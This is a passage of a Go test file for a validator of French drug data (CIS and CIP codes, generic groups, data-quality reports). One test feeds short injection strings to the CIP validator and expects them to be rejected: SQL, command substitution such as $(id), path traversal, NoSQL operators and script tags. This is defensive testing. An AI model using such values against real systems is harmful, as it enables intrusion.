				t.Errorf("Expected error '%s', got '%s'", expectedError, err.Error())
			}
		})
	}
}

func TestValidateCIP_NonNumeric(t *testing.T) {
	validator := NewDataValidator()

	invalidInputs := []string{
		"abcdefg",   // Letters only (7 chars)
		"123456a",   // Mix of letters and numbers (7 chars)
		"123-4567",  // Contains hyphens (8 chars) - fails length check
		"123 4567",  // Contains spaces (8 chars) - fails length check
		"123.4567",  // Contains periods (8 chars) - fails length check
		"123/4567",  // Contains slashes (8 chars) - fails length check
		"ABC1234",   // Mixed case (7 chars)
		"1234568!",  // Contains special character (8 chars) - fails length check
		"12#34567",  // Contains special character (8 chars) - fails length check
		"12_34567",  // Contains underscore (8 chars) - fails length check
		"12\t34567", // Contains tab (8 chars) - fails length check
		"12\n34567", // Contains newline (8 chars) - fails length check
	}

	for _, input := range invalidInputs {
		t.Run("non_numeric_"+input, func(t *testing.T) {
			_, err := validator.ValidateCIP(input)
			if err == nil {
				t.Errorf("Expected error for non-numeric CIP '%s'", input)
			}

			// Some inputs fail length check first, others fail non-numeric check
			expectedErrors := []string{
				"input contains invalid characters. Only numeric characters are allowed",
				"CIP should have 7 or 13 characters",
			}

			if !slices.Contains(expectedErrors, err.Error()) {
				t.Errorf("Expected one of errors '%v', got '%s'", expectedErrors, err.Error())
			}
		})
	}
}

func TestValidateCIP_DangerousPatterns(t *testing.T) {
	validator := NewDataValidator()

	dangerousInputs := []struct {
		input         string
		expectedError string
	}{
		{"1234567<scr>", "CIP should have 7 or 13 characters"},                                      // Length check runs first
		{"1234567js:x", "CIP should have 7 or 13 characters"},                                       // Length check runs first
		{"1234567' OR '", "input contains invalid characters. Only numeric characters are allowed"}, // SQL injection - caught by non-numeric check
		{"1234567; DROP", "input contains invalid characters. Only numeric characters are allowed"}, // Command injection - caught by non-numeric check
		{"1234567../etc", "input contains invalid characters. Only numeric characters are allowed"}, // Path traversal - caught by non-numeric check
		{"1234567{$ne:}", "input contains invalid characters. Only numeric characters are allowed"}, // NoSQL injection - caught by non-numeric check
		{"1234567*)(&", "CIP should have 7 or 13 characters"},                                       // LDAP injection - length check runs first
		{"1234567`whoam", "input contains invalid characters. Only numeric characters are allowed"}, // Command injection - caught by non-numeric check
		{"1234567$(id)", "CIP should have 7 or 13 characters"},                                      // Command injection - length check runs first
		{"1234567eval(x", "input contains invalid characters. Only numeric characters are allowed"}, // XSS with eval - caught by non-numeric check
		{"<script>1234567</script>", "CIP should have 7 or 13 characters"},                          // Too long dangerous pattern
	}

	for _, tc := range dangerousInputs {
		t.Run("dangerous_"+tc.input, func(t *testing.T) {
			_, err := validator.ValidateCIP(tc.input)
			if err == nil {
				t.Errorf("Expected error for dangerous CIP pattern in input '%s'", tc.input)
			}

			if err.Error() != tc.expectedError {
				t.Errorf("Expected error '%s', got '%s'", tc.expectedError, err.Error())
			}
		})
	}

}

func BenchmarkValidateDataIntegrity(b *testing.B) {
	validator := NewDataValidator()

	medicaments := make([]entities.Medicament, 1000)
	for i := range 1000 {
		medicaments[i] = entities.Medicament{
			Cis:          i,
			Denomination: "Test Medicament",
		}
	}

	generiques := make([]entities.GeneriqueList, 100)
	for i := range 100 {
		generiques[i] = entities.GeneriqueList{
			GroupID: i,
			Libelle: "Test Generique",
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: i * 10, Denomination: "Test"},
			},
		}
	}

	b.ResetTimer()
	for b.Loop() {
		if err := validator.ValidateDataIntegrity(medicaments, generiques); err != nil {
			b.Logf("Validation failed: %v", err)
		}
	}
}

func TestReportDataQuality_CleanData(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{
			Cis:          10000001,
			Denomination: "Medicament 1",
			Conditions:   []string{"Condition 1"},
			Composition:  []entities.Composition{{ElementPharmaceutique: "Water"}},
			Presentation: []entities.Presentation{{Cip7: 1234567}},
		},
		{
			Cis:          10000002,
			Denomination: "Medicament 2",
			Conditions:   []string{"Condition 2"},
			Composition:  []entities.Composition{{ElementPharmaceutique: "Paracetamol"}},
			Presentation: []entities.Presentation{{Cip7: 2345678}},
		},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Medicament 1"},
				{Cis: 10000002, Denomination: "Medicament 2"},
			},
		},
		{
			GroupID:   2,
			Libelle:   "Generique 2",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000002, Denomination: "Medicament 2"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if len(report.DuplicateCIS) != 0 {
		t.Errorf("Expected no duplicate CIS, got %v", report.DuplicateCIS)
	}
	if len(report.DuplicateGroupIDs) != 0 {
		t.Errorf("Expected no duplicate group IDs, got %v", report.DuplicateGroupIDs)
	}
	if report.MedicamentsWithoutConditions != 0 {
		t.Errorf("Expected 0 medicaments without conditions, got %d", report.MedicamentsWithoutConditions)
	}
	if report.MedicamentsWithoutGeneriques != 0 {
		t.Errorf("Expected 0 medicaments without generiques, got %d", report.MedicamentsWithoutGeneriques)
	}
	if report.MedicamentsWithoutPresentations != 0 {
		t.Errorf("Expected 0 medicaments without presentations, got %d", report.MedicamentsWithoutPresentations)
	}
	if report.MedicamentsWithoutCompositions != 0 {
		t.Errorf("Expected 0 medicaments without compositions, got %d", report.MedicamentsWithoutCompositions)
	}
	if report.GeneriqueOnlyCIS != 0 {
		t.Errorf("Expected 0 generique-only CIS, got %d", report.GeneriqueOnlyCIS)
	}
}

func TestReportDataQuality_DuplicateCIS(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Medicament 1"},
		{Cis: 10000002, Denomination: "Medicament 2"},
		{Cis: 10000001, Denomination: "Medicament 1 Duplicate"},
		{Cis: 10000003, Denomination: "Medicament 3"},
		{Cis: 10000002, Denomination: "Medicament 2 Duplicate"},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Medicament 1"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if len(report.DuplicateCIS) != 2 {
		t.Errorf("Expected 2 duplicate CIS, got %d: %v", len(report.DuplicateCIS), report.DuplicateCIS)
	}
	if !containsCIS(report.DuplicateCIS, 10000001) {
		t.Errorf("Expected duplicate CIS 10000001, got %v", report.DuplicateCIS)
	}
	if !containsCIS(report.DuplicateCIS, 10000002) {
		t.Errorf("Expected duplicate CIS 10000002, got %v", report.DuplicateCIS)
	}
}

func TestReportDataQuality_DuplicateGroupIDs(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Medicament 1"},
		{Cis: 10000002, Denomination: "Medicament 2"},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Medicament 1"},
			},
		},
		{
			GroupID:   2,
			Libelle:   "Generique 2",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000002, Denomination: "Medicament 2"},
			},
		},
		{
			GroupID:   1,
			Libelle:   "Generique 1 Duplicate",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Medicament 1"},
			},
		},
		{
			GroupID:   3,
			Libelle:   "Generique 3",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000002, Denomination: "Medicament 2"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if len(report.DuplicateGroupIDs) != 1 {
		t.Errorf("Expected 1 duplicate group ID, got %d: %v", len(report.DuplicateGroupIDs), report.DuplicateGroupIDs)
	}
	if !containsCIS(report.DuplicateGroupIDs, 1) {
		t.Errorf("Expected duplicate group ID 1, got %v", report.DuplicateGroupIDs)
	}
}

func TestReportDataQuality_MedicamentsWithoutConditions(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1", Conditions: []string{"Cond 1"}},
		{Cis: 10000002, Denomination: "Med 2", Conditions: []string{}},
		{Cis: 10000003, Denomination: "Med 3", Conditions: []string{}},
		{Cis: 10000004, Denomination: "Med 4", Conditions: []string{"Cond 4"}},
		{Cis: 10000005, Denomination: "Med 5", Conditions: []string{}},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
				{Cis: 10000002, Denomination: "Med 2"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if report.MedicamentsWithoutConditions != 3 {
		t.Errorf("Expected 3 medicaments without conditions, got %d", report.MedicamentsWithoutConditions)
	}
	if len(report.MedicamentsWithoutConditionsCIS) != 3 {
		t.Errorf("Expected 3 CIS in list, got %d: %v", len(report.MedicamentsWithoutConditionsCIS), report.MedicamentsWithoutConditionsCIS)
	}
	if !containsCIS(report.MedicamentsWithoutConditionsCIS, 10000002) {
		t.Errorf("Expected CIS 10000002 in list, got %v", report.MedicamentsWithoutConditionsCIS)
	}
	if !containsCIS(report.MedicamentsWithoutConditionsCIS, 10000003) {
		t.Errorf("Expected CIS 10000003 in list, got %v", report.MedicamentsWithoutConditionsCIS)
	}
	if !containsCIS(report.MedicamentsWithoutConditionsCIS, 10000005) {
		t.Errorf("Expected CIS 10000005 in list, got %v", report.MedicamentsWithoutConditionsCIS)
	}
}

func TestReportDataQuality_MedicamentsWithoutGeneriques(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1"},
		{Cis: 10000002, Denomination: "Med 2"},
		{Cis: 10000003, Denomination: "Med 3"},
		{Cis: 10000004, Denomination: "Med 4"},
		{Cis: 10000005, Denomination: "Med 5"},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000002, Denomination: "Med 2"},
			},
		},
		{
			GroupID:   2,
			Libelle:   "Generique 2",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000004, Denomination: "Med 4"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if report.MedicamentsWithoutGeneriques != 3 {
		t.Errorf("Expected 3 medicaments without generiques, got %d", report.MedicamentsWithoutGeneriques)
	}
	if len(report.MedicamentsWithoutGeneriquesCIS) != 3 {
		t.Errorf("Expected 3 CIS in list, got %d: %v", len(report.MedicamentsWithoutGeneriquesCIS), report.MedicamentsWithoutGeneriquesCIS)
	}
}

func TestReportDataQuality_MedicamentsWithoutPresentations(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1", Presentation: []entities.Presentation{{Cip7: 1234567}}},
		{Cis: 10000002, Denomination: "Med 2", Presentation: []entities.Presentation{}},
		{Cis: 10000003, Denomination: "Med 3", Presentation: []entities.Presentation{}},
		{Cis: 10000004, Denomination: "Med 4", Presentation: []entities.Presentation{{Cip7: 2345678}}},
		{Cis: 10000005, Denomination: "Med 5", Presentation: []entities.Presentation{}},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if report.MedicamentsWithoutPresentations != 3 {
		t.Errorf("Expected 3 medicaments without presentations, got %d", report.MedicamentsWithoutPresentations)
	}
	if len(report.MedicamentsWithoutPresentationsCIS) != 3 {
		t.Errorf("Expected 3 CIS in list, got %d: %v", len(report.MedicamentsWithoutPresentationsCIS), report.MedicamentsWithoutPresentationsCIS)
	}
}

func TestReportDataQuality_MedicamentsWithoutCompositions(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1", Composition: []entities.Composition{{ElementPharmaceutique: "Water"}}},
		{Cis: 10000002, Denomination: "Med 2", Composition: []entities.Composition{}},
		{Cis: 10000003, Denomination: "Med 3", Composition: []entities.Composition{}},
		{Cis: 10000004, Denomination: "Med 4", Composition: []entities.Composition{}},
		{Cis: 10000005, Denomination: "Med 5", Composition: []entities.Composition{}},
		{Cis: 10000006, Denomination: "Med 6", Composition: []entities.Composition{}},
		{Cis: 10000007, Denomination: "Med 7", Composition: []entities.Composition{}},
		{Cis: 10000008, Denomination: "Med 8", Composition: []entities.Composition{}},
		{Cis: 10000009, Denomination: "Med 9", Composition: []entities.Composition{}},
		{Cis: 10000010, Denomination: "Med 10", Composition: []entities.Composition{}},
		{Cis: 10000011, Denomination: "Med 11", Composition: []entities.Composition{}},
		{Cis: 10000012, Denomination: "Med 12", Composition: []entities.Composition{}},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if report.MedicamentsWithoutCompositions != 11 {
		t.Errorf("Expected 11 medicaments without compositions, got %d", report.MedicamentsWithoutCompositions)
	}
	if len(report.MedicamentsWithoutCompositionsCIS) != 11 {
		t.Errorf("Expected 11 CIS in list (ALL should be stored), got %d: %v", len(report.MedicamentsWithoutCompositionsCIS), report.MedicamentsWithoutCompositionsCIS)
	}
	if !containsCIS(report.MedicamentsWithoutCompositionsCIS, 10000012) {
		t.Errorf("Expected CIS 10000012 in list (all CIS should be stored), got %v", report.MedicamentsWithoutCompositionsCIS)
	}
}

func TestReportDataQuality_GeneriqueOnlyCIS(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1"},
		{Cis: 10000002, Denomination: "Med 2"},
		{Cis: 10000003, Denomination: "Med 3"},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{10000004, 10000005, 10000006},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
			},
		},
		{
			GroupID:   2,
			Libelle:   "Generique 2",
			OrphanCIS: []int{10000007, 10000008, 10000009, 10000010},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000002, Denomination: "Med 2"},
			},
		},
		{
			GroupID:   3,
			Libelle:   "Generique 3",
			OrphanCIS: []int{10000011},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000003, Denomination: "Med 3"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if report.GeneriqueOnlyCIS != 8 {
		t.Errorf("Expected 8 generique-only CIS, got %d", report.GeneriqueOnlyCIS)
	}
	if len(report.GeneriqueOnlyCISList) != 8 {
		t.Errorf("Expected 8 CIS in list, got %d: %v", len(report.GeneriqueOnlyCISList), report.GeneriqueOnlyCISList)
	}
	if !containsCIS(report.GeneriqueOnlyCISList, 10000011) {
		t.Errorf("Expected CIS 10000011 in list, got %v", report.GeneriqueOnlyCISList)
	}
}

func TestReportDataQuality_MultipleIssues(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1", Conditions: []string{"Cond 1"}, Composition: []entities.Composition{{ElementPharmaceutique: "A"}}, Presentation: []entities.Presentation{{Cip7: 1234567}}},
		{Cis: 10000002, Denomination: "Med 2", Conditions: []string{}, Composition: []entities.Composition{}, Presentation: []entities.Presentation{}},
		{Cis: 10000001, Denomination: "Med 1 Duplicate", Conditions: []string{"Cond 1"}, Composition: []entities.Composition{{ElementPharmaceutique: "A"}}, Presentation: []entities.Presentation{{Cip7: 1234567}}},
		{Cis: 10000003, Denomination: "Med 3", Conditions: []string{}, Composition: []entities.Composition{{ElementPharmaceutique: "C"}}, Presentation: []entities.Presentation{}},
		{Cis: 10000004, Denomination: "Med 4", Conditions: []string{"Cond 4"}, Composition: []entities.Composition{}, Presentation: []entities.Presentation{}},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{10000005, 10000006},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
			},
		},
		{
			GroupID:   2,
			Libelle:   "Generique 2",
			OrphanCIS: []int{10000007},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000002, Denomination: "Med 2"},
			},
		},
		{
			GroupID:   1,
			Libelle:   "Generique 1 Duplicate",
			OrphanCIS: []int{10000008},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if len(report.DuplicateCIS) != 1 {
		t.Errorf("Expected 1 duplicate CIS, got %d: %v", len(report.DuplicateCIS), report.DuplicateCIS)
	}
	if len(report.DuplicateGroupIDs) != 1 {
		t.Errorf("Expected 1 duplicate group ID, got %d: %v", len(report.DuplicateGroupIDs), report.DuplicateGroupIDs)
	}
	if report.MedicamentsWithoutConditions != 2 {
		t.Errorf("Expected 2 medicaments without conditions, got %d", report.MedicamentsWithoutConditions)
	}
	if report.MedicamentsWithoutGeneriques != 2 {
		t.Errorf("Expected 2 medicaments without generiques, got %d", report.MedicamentsWithoutGeneriques)
	}
	if report.MedicamentsWithoutPresentations != 3 {
		t.Errorf("Expected 3 medicaments without presentations, got %d", report.MedicamentsWithoutPresentations)
	}
	if report.MedicamentsWithoutCompositions != 2 {
		t.Errorf("Expected 2 medicaments without compositions, got %d", report.MedicamentsWithoutCompositions)
	}
	if report.GeneriqueOnlyCIS != 4 {
		t.Errorf("Expected 4 generique-only CIS, got %d", report.GeneriqueOnlyCIS)
	}
}

func TestReportDataQuality_EmptyInputs(t *testing.T) {
	validator := NewDataValidator()

	report := validator.ReportDataQuality([]entities.Medicament{}, []entities.GeneriqueList{}, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if len(report.DuplicateCIS) != 0 {
		t.Errorf("Expected no duplicate CIS, got %v", report.DuplicateCIS)
	}
	if len(report.DuplicateGroupIDs) != 0 {
		t.Errorf("Expected no duplicate group IDs, got %v", report.DuplicateGroupIDs)
	}
	if report.MedicamentsWithoutConditions != 0 {
		t.Errorf("Expected 0 medicaments without conditions, got %d", report.MedicamentsWithoutConditions)
	}
	if report.MedicamentsWithoutGeneriques != 0 {
		t.Errorf("Expected 0 medicaments without generiques, got %d", report.MedicamentsWithoutGeneriques)
	}
	if report.MedicamentsWithoutPresentations != 0 {
		t.Errorf("Expected 0 medicaments without presentations, got %d", report.MedicamentsWithoutPresentations)
	}
	if report.MedicamentsWithoutCompositions != 0 {
		t.Errorf("Expected 0 medicaments without compositions, got %d", report.MedicamentsWithoutCompositions)
	}
	if report.GeneriqueOnlyCIS != 0 {
		t.Errorf("Expected 0 generique-only CIS, got %d", report.GeneriqueOnlyCIS)
	}
}

func TestReportDataQuality_BoundaryTenItems(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1", Conditions: []string{}},
		{Cis: 10000002, Denomination: "Med 2", Conditions: []string{}},
		{Cis: 10000003, Denomination: "Med 3", Conditions: []string{}},
		{Cis: 10000004, Denomination: "Med 4", Conditions: []string{}},
		{Cis: 10000005, Denomination: "Med 5", Conditions: []string{}},
		{Cis: 10000006, Denomination: "Med 6", Conditions: []string{}},
		{Cis: 10000007, Denomination: "Med 7", Conditions: []string{}},
		{Cis: 10000008, Denomination: "Med 8", Conditions: []string{}},
		{Cis: 10000009, Denomination: "Med 9", Conditions: []string{}},
		{Cis: 10000010, Denomination: "Med 10", Conditions: []string{}},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if report.MedicamentsWithoutConditions != 10 {
		t.Errorf("Expected 10 medicaments without conditions, got %d", report.MedicamentsWithoutConditions)
	}
	if len(report.MedicamentsWithoutConditionsCIS) != 10 {
		t.Errorf("Expected 10 CIS in list (at boundary), got %d: %v", len(report.MedicamentsWithoutConditionsCIS), report.MedicamentsWithoutConditionsCIS)
	}
}

func TestReportDataQuality_MoreThanTenItems(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1", Conditions: []string{}},
		{Cis: 10000002, Denomination: "Med 2", Conditions: []string{}},
		{Cis: 10000003, Denomination: "Med 3", Conditions: []string{}},
		{Cis: 10000004, Denomination: "Med 4", Conditions: []string{}},
		{Cis: 10000005, Denomination: "Med 5", Conditions: []string{}},
		{Cis: 10000006, Denomination: "Med 6", Conditions: []string{}},
		{Cis: 10000007, Denomination: "Med 7", Conditions: []string{}},
		{Cis: 10000008, Denomination: "Med 8", Conditions: []string{}},
		{Cis: 10000009, Denomination: "Med 9", Conditions: []string{}},
		{Cis: 10000010, Denomination: "Med 10", Conditions: []string{}},
		{Cis: 10000011, Denomination: "Med 11", Conditions: []string{}},
		{Cis: 10000012, Denomination: "Med 12", Conditions: []string{}},
		{Cis: 10000013, Denomination: "Med 13", Conditions: []string{}},
		{Cis: 10000014, Denomination: "Med 14", Conditions: []string{}},
		{Cis: 10000015, Denomination: "Med 15", Conditions: []string{}},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if report.MedicamentsWithoutConditions != 15 {
		t.Errorf("Expected 15 medicaments without conditions, got %d", report.MedicamentsWithoutConditions)
	}
	if len(report.MedicamentsWithoutConditionsCIS) != 10 {
		t.Errorf("Expected only 10 CIS in list (limit exceeded), got %d: %v", len(report.MedicamentsWithoutConditionsCIS), report.MedicamentsWithoutConditionsCIS)
	}
	if containsCIS(report.MedicamentsWithoutConditionsCIS, 10000015) {
		t.Errorf("Should not contain CIS 10000015 (should only have first 10), got %v", report.MedicamentsWithoutConditionsCIS)
	}
	if !containsCIS(report.MedicamentsWithoutConditionsCIS, 10000010) {
		t.Errorf("Should contain CIS 10000010 (10th item), got %v", report.MedicamentsWithoutConditionsCIS)
	}
}

func TestReportDataQuality_MoreThanTenItemsPresentations(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1", Presentation: []entities.Presentation{}},
		{Cis: 10000002, Denomination: "Med 2", Presentation: []entities.Presentation{}},
		{Cis: 10000003, Denomination: "Med 3", Presentation: []entities.Presentation{}},
		{Cis: 10000004, Denomination: "Med 4", Presentation: []entities.Presentation{}},
		{Cis: 10000005, Denomination: "Med 5", Presentation: []entities.Presentation{}},
		{Cis: 10000006, Denomination: "Med 6", Presentation: []entities.Presentation{}},
		{Cis: 10000007, Denomination: "Med 7", Presentation: []entities.Presentation{}},
		{Cis: 10000008, Denomination: "Med 8", Presentation: []entities.Presentation{}},
		{Cis: 10000009, Denomination: "Med 9", Presentation: []entities.Presentation{}},
		{Cis: 10000010, Denomination: "Med 10", Presentation: []entities.Presentation{}},
		{Cis: 10000011, Denomination: "Med 11", Presentation: []entities.Presentation{}},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if report.MedicamentsWithoutPresentations != 11 {
		t.Errorf("Expected 11 medicaments without presentations, got %d", report.MedicamentsWithoutPresentations)
	}
	if len(report.MedicamentsWithoutPresentationsCIS) != 10 {
		t.Errorf("Expected only 10 CIS in list (limit exceeded), got %d: %v", len(report.MedicamentsWithoutPresentationsCIS), report.MedicamentsWithoutPresentationsCIS)
	}
}

func TestReportDataQuality_MoreThanTenItemsGeneriqueOnlyCIS(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1"},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{10000002, 10000003, 10000004, 10000005, 10000006, 10000007, 10000008, 10000009, 10000010, 10000011, 10000012},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if report.GeneriqueOnlyCIS != 11 {
		t.Errorf("Expected 11 generique-only CIS, got %d", report.GeneriqueOnlyCIS)
	}
	if len(report.GeneriqueOnlyCISList) != 10 {
		t.Errorf("Expected only 10 CIS in list (limit exceeded), got %d: %v", len(report.GeneriqueOnlyCISList), report.GeneriqueOnlyCISList)
	}
}

func TestReportDataQuality_CompositionsNoLimit(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1", Composition: []entities.Composition{{ElementPharmaceutique: "A"}}},
		{Cis: 10000002, Denomination: "Med 2", Composition: []entities.Composition{}},
		{Cis: 10000003, Denomination: "Med 3", Composition: []entities.Composition{}},
		{Cis: 10000004, Denomination: "Med 4", Composition: []entities.Composition{}},
		{Cis: 10000005, Denomination: "Med 5", Composition: []entities.Composition{}},
		{Cis: 10000006, Denomination: "Med 6", Composition: []entities.Composition{}},
		{Cis: 10000007, Denomination: "Med 7", Composition: []entities.Composition{}},
		{Cis: 10000008, Denomination: "Med 8", Composition: []entities.Composition{}},
		{Cis: 10000009, Denomination: "Med 9", Composition: []entities.Composition{}},
		{Cis: 10000010, Denomination: "Med 10", Composition: []entities.Composition{}},
		{Cis: 10000011, Denomination: "Med 11", Composition: []entities.Composition{}},
		{Cis: 10000012, Denomination: "Med 12", Composition: []entities.Composition{}},
		{Cis: 10000013, Denomination: "Med 13", Composition: []entities.Composition{}},
		{Cis: 10000014, Denomination: "Med 14", Composition: []entities.Composition{}},
		{Cis: 10000015, Denomination: "Med 15", Composition: []entities.Composition{}},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if report.MedicamentsWithoutCompositions != 14 {
		t.Errorf("Expected 14 medicaments without compositions, got %d", report.MedicamentsWithoutCompositions)
	}
	if len(report.MedicamentsWithoutCompositionsCIS) != 14 {
		t.Errorf("Expected 14 CIS in list (NO LIMIT for compositions), got %d: %v", len(report.MedicamentsWithoutCompositionsCIS), report.MedicamentsWithoutCompositionsCIS)
	}
	if !containsCIS(report.MedicamentsWithoutCompositionsCIS, 10000015) {
		t.Errorf("Expected CIS 10000015 in list (all CIS should be stored), got %v", report.MedicamentsWithoutCompositionsCIS)
	}
}

func TestReportDataQuality_MedicamentsWithoutGeneriques_MultipleGeneriquesSameCIS(t *testing.T) {
	validator := NewDataValidator()

	medicaments := []entities.Medicament{
		{Cis: 10000001, Denomination: "Med 1"},
		{Cis: 10000002, Denomination: "Med 2"},
		{Cis: 10000003, Denomination: "Med 3"},
		{Cis: 10000004, Denomination: "Med 4"},
	}

	generiques := []entities.GeneriqueList{
		{
			GroupID:   1,
			Libelle:   "Generique 1",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
			},
		},
		{
			GroupID:   2,
			Libelle:   "Generique 2",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000002, Denomination: "Med 2"},
			},
		},
		{
			GroupID:   3,
			Libelle:   "Generique 3",
			OrphanCIS: []int{},
			Medicaments: []entities.GeneriqueMedicament{
				{Cis: 10000001, Denomination: "Med 1"},
				{Cis: 10000003, Denomination: "Med 3"},
			},
		},
	}

	report := validator.ReportDataQuality(medicaments, generiques, make(map[int]entities.Presentation), make(map[int]entities.Presentation))

	if report.MedicamentsWithoutGeneriques != 1 {
		t.Errorf("Expected 1 medicament without generiques (CIS 10000004), got %d", report.MedicamentsWithoutGeneriques)
	}
	if !containsCIS(report.MedicamentsWithoutGeneriquesCIS, 10000004) {
